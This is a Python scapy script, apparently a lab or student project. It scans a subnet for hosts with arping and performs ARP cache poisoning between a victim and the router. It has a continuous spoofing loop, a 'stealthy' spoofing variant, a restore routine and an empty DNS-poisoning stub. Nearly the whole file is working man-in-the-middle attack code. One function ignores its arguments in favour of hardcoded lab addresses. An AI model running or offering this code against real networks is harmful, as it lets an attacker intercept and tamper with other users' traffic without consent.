#! /usr/bin/env python

from scapy.all import *
import socket
import math
import logging

logger = logging.getLogger()


# Converts the byte formats that scapy returns to something we can read
def format_ip(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = 32 - int(round(math.log(0xFFFFFFFF - bytes_netmask, 2)))
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        logger.warn("netmask %s too big" % net)
        return None

    return net


# Scans a given scapy net for active devices with the scapy arping method.
# Needs an net and interface as inputs (e.g. scan("192.168.56.0/24", "enp0s3") could work)
# Returns a nested list with IP addresses and the default gateway marked with string Default
def scan(net, interface, timeout=5):
    logger.info("Using scapy arping with %s on %s" % (net, interface))

    found_ips = []
    try:
        ans, unans = scapy.all.arping(net, iface=interface, timeout=timeout, verbose=True)
        for s, r in ans:
            ms = [r.src, r.psrc]
            found_ips.append(ms)
            line = r.src + " " + r.psrc
            logger.info(line)
    except socket.error as e:
        raise

    return found_ips


# Method that grabs all the interfaces from the scapy config returns a list with strings
def get_interfaces():
    interfaces = []
    for network, netmask, _, interface, address in scapy.config.conf.route.routes:

        # Skip standard interfaces and invalid netmasks.
        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0' or netmask <= 0 or netmask == 0xFFFFFFFF:
            continue

        # Format the net/ip
        net = format_ip(network, netmask)
        if net:
            interfaces += [net + ", " + interface]

    return interfaces


# Normal way of doing ARP spoofing
def arp_spoof(victim_ip, victim_mac, router_ip, router_mac):
    # Gets the mac address of the attacker
    interface = scapy.all.get_working_if()
    attacker_mac = scapy.all.get_if_hwaddr(interface)

    # sends packets to the victim and server, performing ARP spoofing
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac, hwsrc=attacker_mac))
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac, hwsrc=attacker_mac))


# Restores the ARP spoofing packets by resetting back to original state
def arp_restore(victim_ip, victim_mac, router_ip, router_mac):
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=4)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=4)


# Does ARP spoofing but in a more stealthy way
def arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac):
    # Gets the mac address of the attacker
    interface = scapy.all.get_working_if()
    attacker_mac = scapy.all.get_if_hwaddr(interface)

    # Sends packet to the server
    scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))


def arp_poison(victim_ip, victim_mac, router_ip, router_mac):
    print("Spoofing network...")
    try:
        while 1:
            arp_spoof(victim_ip, victim_mac, router_ip, router_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Restoring network...")
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)


def arp_poison_stealthy(victim_ip, victim_mac, router_ip, router_mac):
    arp_spoof('192.168.56.101', '0:0:0:0:0:0', '192.168.56.1', '0a:00:27:00:00:13')
    arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac)


def dnsPoison():
    print("")
